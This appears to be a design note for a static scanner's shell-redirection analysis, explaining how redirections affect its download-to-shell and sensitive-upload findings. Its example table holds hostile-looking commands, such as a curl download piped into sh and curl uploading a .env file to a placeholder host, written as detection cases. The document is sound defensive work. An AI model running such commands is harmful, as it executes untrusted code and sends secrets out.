# Ordered shell redirection review (A4.2, partial)

The static scanner tracks a bounded subset of literal stdin/stdout redirections.
This closes two gaps: a download redirected into a file no longer becomes a
download-to-shell pipeline finding, and a sensitive input path redirected into
an upload command can produce STA002. All paths and command values stay internal
to analysis; existing findings retain the selected source file's original hash.

These are POSIX-style syntax associations. AEGIS does not establish the actual
shell, operating system, command implementation, reachability or file contents.
Each encountered redirection adds `shell-redirection-dialect-not-verified`, so
the report remains incomplete even when its supported stream association is known.
Findings retain `confidence: heuristic` and `safety: not-determined`.

## Supported subset

The tokenizer separates unquoted redirection operators and their targets from
process arguments. Adjacent unquoted IO numbers select a descriptor; quoted,
escaped or whitespace-separated numbers remain arguments. Quoted operators and
supported escaped operators stay literal. The existing process-argv entry point
does not interpret argument strings as shell syntax.

| Form | Association |
| --- | --- |
| `< path`, `0< path` | Literal file supplies stdin; a recognized sensitive path tags that input |
| `> path`, `1> path`, `>> path` | Stdout goes to the named file, ending its contribution to the current pipe |
| `2> path`, `2>> path` | Stderr goes to a file; stdout keeps its own endpoint |
| `n>&m`, `n<&m` | Copy an existing supported descriptor's current endpoint when its direction is supported |
| `n>&-`, `n<&-` | Close a supported descriptor; it supplies no inferred payload |

Only descriptors 0, 1 and 2 participate. Pipeline endpoints are established
before redirections; redirections then apply from left to right. A descriptor
copy keeps the endpoint observed at that position. Stderr is never assumed to
contain a downloaded command or secret. Literal `/dev/null` contributes no payload.

| Command pattern | Static result |
| --- | --- |
| `curl https://example.invalid >download.sh \| sh` | No STA001: stdout was redirected away from the pipe |
| `curl https://example.invalid 2>errors.log \| sh` | STA001: stdout still feeds the shell |
| `curl https://example.invalid 2>&1 1>&2 \| sh` | STA001: both copies retain the original stdout pipe |
| `curl https://example.invalid 1>&2 2>&1 \| sh` | No STA001: stdout points to the original stderr endpoint |
| `curl --data-binary @- https://example.invalid <.env` | STA002: the upload consumes a sensitive stdin path |
| `cat <.env \| curl --data-binary @- https://example.invalid` | STA002: the supported pass-through preserves the input tag |
| `cat .env \| curl --data-binary @- https://example.invalid <public.txt` | No STA002 from this pipe: the consumer replaced stdin |

Absence of these two flow findings does not establish safety. Independent direct
patterns still apply, such as broad deletion or an explicit sensitive upload file.
A supported shell reading a named input file reports `referenced-code-not-analyzed`;
the scanner does not open or follow that file because of the redirection.

## Gaps and failure behavior

Dynamic or glob-expanded targets, unsupported descriptor operations and virtual
stream paths such as `/dev/stdout`, `/dev/fd/*`, `/dev/tcp/*` and `/proc/*` receive
fixed coverage gaps and lose the affected stream inference. Unknown descriptors
or unsupported descriptor copies/moves invalidate all three endpoints because
they can affect a second descriptor. Lexical aliases of these absolute paths are
treated conservatively; no filesystem resolution occurs. Descriptor moves such
as `2>&1-` are unsupported. File existence, permissions, symlinks, devices, prior
writes and actual file content remain unverified.

Malformed or unsupported redirection syntax does not create inferred commands.
Here-documents, here-strings, process/command substitutions, grouping, Bash
combined redirections and `|&` remain outside this subset. Structurally ambiguous
command text is rejected with a fixed gap. Script review stops at unsupported
multiline input boundaries to keep body text from becoming independent commands.
Ordinary backslash/caret coverage gaps remain visible without asserting a dialect.

This adds no variable expansion, file-history flow, propagation through arbitrary
nested shell bodies, PowerShell stream model, instruction-semantic analysis or
action blocking. PowerShell has different input and output stream rules; the
dialect gap also applies when this syntax appears in a PowerShell-labeled source.

## Bounds and compatibility

The existing 16,384-character command bound, 256-token budget and shell-wrapper
depth bound remain. Operators and redirect targets consume token budget, and
each parsed command text permits at most 64 redirections. Input and output paths
never trigger additional file reads or writes. No command or source is executed.

Reports use schema version 1 and `aegis-static-patterns` version 7. The scope field
`shellRedirections: bounded-posix-stdio-associations` and the
`commandRedirections: 64` limit require fresh comparison when importing an external
report against a baseline that predates this coverage. Older observations are not
accepted automatically.

Tests cover the parser, stream ordering, false-positive suppression, sensitive
stdin, native argv, unsupported syntax, resource limits and public scanner/CLI
consumers. Fixtures verify unchanged output files and no extra target reads.
Verification results are recorded in the implementation PR.

Primary references checked on 2026-09-16:

- [POSIX Shell Command Language](https://pubs.opengroup.org/onlinepubs/9799919799/utilities/V3_chap02.html): IO-number quoting, redirection syntax and descriptor operations.
- [Bash redirections](https://www.gnu.org/s/bash/manual/html_node/Redirections.html) and [pipelines](https://www.gnu.org/s/bash/manual/html_node/Pipelines.html): endpoint ordering, descriptor copies and special paths.
- [PowerShell redirection](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_redirection?view=powershell-7.5): its separate stream model and redirection restrictions.
